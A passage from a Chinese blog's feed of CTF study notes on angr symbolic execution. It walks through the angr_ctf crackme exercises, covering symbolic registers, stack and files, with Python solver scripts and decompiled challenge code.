class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me((<span class="type">int</span>)buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，这道打开了一个文件。在这道题的基础上，我们可以使用angr模拟文件从而进行文件内容符号化，我们用到了几个关键语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_size=<span class="number">0x40</span></span><br><span class="line">filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">init_state.fs.insert(filename,file_name)</span><br></pre></td></tr></table></figure><p>我们利用angr.storage.SimFile模拟文件，第一个参数为文件名，第二个为我们的向量，第三个为题目本身的读入的size，然后模拟完后，我们再对文件系统进行载入init_state.fs.insert(filename,file_name)即可实现文件符号化</p><p>然后剩下就是用angr进行模拟，获取状态，获取向量状态值，一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./07_angr_symbolic_file&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    </span><br><span class="line">    start_address=<span class="number">0x80488EA</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    file_size=<span class="number">0x40</span></span><br><span class="line">    filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">    file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">    init_state.fs.insert(filename,file_name)</span><br><span class="line">    </span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        passwd=sol_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colund not!!!!!!&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solver()   </span><br></pre></td></tr></table></figure><p>未完持续</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-Angr-符号执行学习（一）&quot;&gt;&lt;a href=&quot;#CTF-Angr-符号执行学习（一）&quot; class=&quot;headerlink&quot; title=&quot;CTF Angr 符号执行学习（一）&quot;&gt;&lt;/a&gt;CTF Angr 符号执行学习（一）&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="angr" scheme="https://jsjsj.top/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>CTF Angr 符号执行学习（一）</title>
    <link href="https://jsjsj.top/2022/10/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/"/>
    <id>https://jsjsj.top/2022/10/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-10-03T14:17:58.000Z</published>
    <updated>2023-10-03T14:30:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-Angr-符号执行学习（一）"><a href="#CTF-Angr-符号执行学习（一）" class="headerlink" title="CTF Angr 符号执行学习（一）"></a>CTF Angr 符号执行学习（一）</h1><h2 id="前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了"><a href="#前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了" class="headerlink" title="前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了"></a>前言：最近对自动化二进制漏洞挖掘哼感兴趣，百度了下，发现自动化二进制漏洞挖掘的一个核心技术之一Angr符号执行，感觉很有意思再加上之前比赛也有很多关于Angr的题目，angr也可以对抗代码混淆ollvm这些，感觉以后用处蛮大的，于是就学了学，这里记录下笔记，发到博客里和微信公众号里供大家学习，学了一天，才刚学到07文件符号执行化，就分别总结成了一、二、三篇，太菜了</h2><h2 id="一、00"><a href="#一、00" class="headerlink" title="一、00"></a>一、00</h2><p>我们要用到两个模块，一个angr和一个sys</p><p>angr进行符号执行，sys来进行用户输入输出</p><p>我们第一步要进行angr脚本去跑约束逆向的时候，</p><p>第一步：</p><p>1.创建文件项目：</p><p>proj&#x3D;angr.Project(binary,auto_load_libs&#x3D;False)，不加载libc</p><p>2.初始化地址块 </p><p>state&#x3D;proj.factory.entry_state()   这里的块初始化到了程序的start 块</p><p>3.初始化以后，我们要对这个块进行模拟</p><p>sim&#x3D;proj.factory.simgr(state)</p><p>4.模拟后，开始寻找正确的路径</p><p>ok_address&#x3D;0x8048675<br>sim.explore(find&#x3D;ok_address)  这里是我们输出正确的路径</p><p>5.搜索到路径后，把状态放到sim.found[0]里，然后从这个状态里取出来即可</p><pre><code>if sim.found:    solution_state=sim.found[0]    print(solution_state.posix.dumps(sys.stdin.fileno()).decode())</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./00_angr_find&quot;</span></span><br><span class="line">    proj=angr.Project(binary,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x8048675</span></span><br><span class="line">    sim.explore(find=ok_address)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="二、01"><a href="#二、01" class="headerlink" title="二、01"></a>二、01</h2><p>这个案例，前面部分跟00一样，在寻找路径的时候，explore的时候加个avoid参数，这个参数就避开错误代码块的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./01_angr_avoid&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x80485E0</span></span><br><span class="line">    bi_kai=<span class="number">0x80485A8</span></span><br><span class="line">    sim.explore(find=ok_address,avoid=bi_kai)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no !!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="三、02"><a href="#三、02" class="headerlink" title="三、02"></a>三、02</h2><p>这里刚上面一样，唯一的区别就是，自己写了一个避开的函数和正确的函数，赋给了find和avoid，效果都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./02_angr_find_condition&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    init_state=proj.factory.entry_state()</span><br><span class="line">    sim=proj.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    ok_address=<span class="number">0x08048715</span></span><br><span class="line">    sim.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state=sim.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="四、03-regs-寄存器"><a href="#四、03-regs-寄存器" class="headerlink" title="四、03  regs 寄存器"></a>四、03  regs 寄存器</h2><p>这里就有特点了，对寄存器的操作</p><p>我们看题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 user_input; // rax</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+4h] [ebp-14h]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp+8h] [ebp-10h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  user_input = get_user_input();</span><br><span class="line">  v7 = HIDWORD(user_input);</span><br><span class="line">  v5 = complex_function_1(user_input);</span><br><span class="line">  v6 = complex_function_2();</span><br><span class="line">  v8 = complex_function_3(v7);</span><br><span class="line">  <span class="keyword">if</span> ( v5 || v6 || v8 )</span><br><span class="line">    puts(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_user_input：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> get_user_input()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+4h] [ebp-14h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v3[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(0x14u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x %x %x&quot;</span>, &amp;v1, &amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面两行代码我们发现，在getuserinput这个函数里，对v1、v2、v3进行了输入，然后只用了v1，然后看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br></pre></td></tr></table></figure><p>发现三个值传给 了eax ebx ecx，我们可以在输入函数之后，利用向量给 initial_state.regs.eax  ebx edx，进行向量的赋值，在后面进行状态查看即可，分析完后，我这里对关键的exp 代码进行分析</p><p>（1）.start_address&#x3D;0x08048980<br>    initial_state&#x3D;proj.factory.blank_state(addr&#x3D;start_address) 这里在输入函数之后开始空白块，我这里理解的空白块是从这里开始进行向下执行，并且绕过程序自己的输入函数，我们自己进行对reg来操作赋值</p><p>（2）.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br></pre></td></tr></table></figure><p>用claripy进行向量的创建，创建3个向量，因为是int32位，所以这里后面写成了32，然后再把三个向量导入到eax ebx edx</p><p>（3）.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr=proj.factory.simgr(initial_state)</span><br><span class="line">simgr.explore(find=find_path,avoid=avoid_path)</span><br></pre></td></tr></table></figure><p>然后进行模拟执行并且查询</p><p>（4) .</p><p>然后通过simgr.found获取解决后的state（状态），</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solution0=solution_state.solver.eval(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.eval(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.eval(passwd_2)</span><br></pre></td></tr></table></figure><p>然后再用solution_state.solver.eval获取状态值，获取到状态值打印即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./03_angr_symbolic_registers&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x08048980</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_0=claripy.BVS(<span class="string">&#x27;passwd_0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_1=claripy.BVS(<span class="string">&#x27;passwd_1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd_2=claripy.BVS(<span class="string">&#x27;passwd_2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.eax=passwd_0</span><br><span class="line">    initial_state.regs.ebx=passwd_1</span><br><span class="line">    initial_state.regs.edx=passwd_2</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd_0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd_1)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd_2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd0:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd1:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;passwd2:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution2)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="五、04-stack"><a href="#五、04-stack" class="headerlink" title="五、04 stack"></a>五、04 stack</h2><p>这里是对stack的一个符号化，对栈的化，就得注意栈的分布了，esp和ebp寄存器这些</p><p>我们还是选关键代码进行分析</p><p>（1）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)  <span class="comment">#这里创建了向量</span></span><br><span class="line">passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)   <span class="comment">#</span></span><br><span class="line">initial_state.regs.ebp=initial_state.regs.esp  </span><br><span class="line">initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">initial_state.stack_push(passwd0)</span><br><span class="line">initial_state.stack_push(passwd1)</span><br></pre></td></tr></table></figure><p>第一步先把寄存器esp给了ebp，然后让esp-0x8，这里减0x8的原因，我推测有两个原因，一是联系上下文、二是开辟栈空间</p><p>然后把我们创建的向量放到stack上即可，下面代码还是老一套，solver.eval(向量状态)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./04_angr_symbolic_stack&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span 